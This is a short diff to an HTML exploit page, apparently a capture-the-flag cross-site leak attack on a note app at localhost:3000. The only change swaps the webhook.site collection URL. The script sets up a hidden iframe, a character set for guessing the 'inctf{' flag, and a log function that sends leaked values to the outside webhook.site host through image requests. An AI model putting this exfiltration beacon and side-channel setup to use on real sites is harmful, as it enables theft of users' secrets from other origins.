@@ -1,5 +1,5 @@
 <!doctype html><html><body><iframe name="sink" style="display:none"></iframe><script>
-const TARGET='https://localhost:3000', COLLECT='https://9a73f059-d808-47c4-b035-4281889d9fea.webhook.site/log', NOTE_ID=1, N_SUB=30;
+const TARGET='https://localhost:3000', COLLECT='https://5e0f0fb8-5d1c-4ea5-978d-5c3d2ac391a8.webhook.site/log', NOTE_ID=1, N_SUB=30;
 const WORDS=Array(4000).fill('qq').join(' '), PREFIX='inctf{';
 const CHARSET="_abcdefghijklmnopqrstuvwxyz0123456789{}-!?.@$#ABCDEFGHIJKLMNOPQRSTUVWXYZ".split('');
 function log(k,v){new Image().src=COLLECT+'?'+k+'='+encodeURIComponent(v)+'&t='+Date.now();}
